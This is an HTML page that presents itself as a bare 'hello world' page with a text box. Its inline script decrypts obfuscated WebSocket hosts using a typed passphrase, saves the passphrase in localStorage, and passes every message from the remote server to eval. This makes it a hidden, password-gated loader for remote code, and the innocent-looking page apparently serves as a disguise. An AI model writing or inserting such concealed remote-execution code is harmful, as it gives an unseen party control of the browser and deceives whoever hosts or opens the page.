<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui">
    <title>d0b3.github.io</title>
    <style>
      html, body { margin: 0; height: 100%; }
      body {
        display: flex;
        flex-flow: column;
        align-items: center;
        justify-content: center;
        background: #fefbf7;
        color: #a0bcc2;
      }
      textarea {
        width: 480px;
        height: 320px;
      }
    </style>
    <script type="module">

      await new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }));

      async function sha (t) { return new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(t))); };
      async function dec (sock, salt, pass) {
    sock = new Uint8Array(sock.match(/.{2}/g).map(s=>parseInt(s, 16)));
    const flp = await sha(salt+pass+salt);
    for (let i = 0; i < sock.length; i++) sock[i] ^= flp[i%flp.length];
    try {
      const host = new TextDecoder().decode(sock.slice(32)).trim(),
            chk = await sha(host);
      for (let i = 0; i < chk.length; i++) if (chk[i] !== sock[i]) return;
      return 'ws'+host.slice(4)+'/'+[...flp].map(b=>b.toString(16).padStart(2,'0')).join('');
    } catch { }
  };

      const SOCK = ["2003bed4419cd0115d98a486e54678552bc074fe4659763f061f028c6a4e9143bd69dd4579b5f4089ddcaf4d1786412fab64f23129a4a71e21d0d26cf4ce345cf02b92092ab8fd0cc7d8ae0e5bc55933a367e77d3eb9e00e3ad89c2fb1c36705bd69dd","f6698e80b511da1be380255a1cf6d635a491fe1f8202b66db96953ff7eb78a656b03ed118d38fe0223c42e91ee36ef4f243578d0edff674c9ea6831fe0372f7a2641a25dde35f70679c02fd2a275f7532c366d9cfae2205c85aecd5ca53a7c"];

      const $ta = document.querySelector('textarea');
      try { $ta.value = localStorage.getItem('value') || ''; } catch { };

      $ta.onchange = $ta.onkeyup = async () => {
        const value = $ta.value.trim();
        if (!value) return;
        for (const sock of SOCK) {
          const url = await dec(sock, "whatever", value);
          if (url) {
            $ta.value = 'connecting';
            localStorage.setItem('value', value);
            const socket = new WebSocket(url);
            socket.binaryType = 'arraybuffer';
            socket.onmessage = ev => { eval(new TextDecoder().decode(ev.data))(socket); };
            socket.onerror = () => { $ta.value = 'vodafone m√ºde'; };
            return;
          }
        }
      };

      $ta.onchange();

    </script>
  </head>
  <body>
    <h1>hello world</h1>
    <textarea></textarea>
  </body>
</html>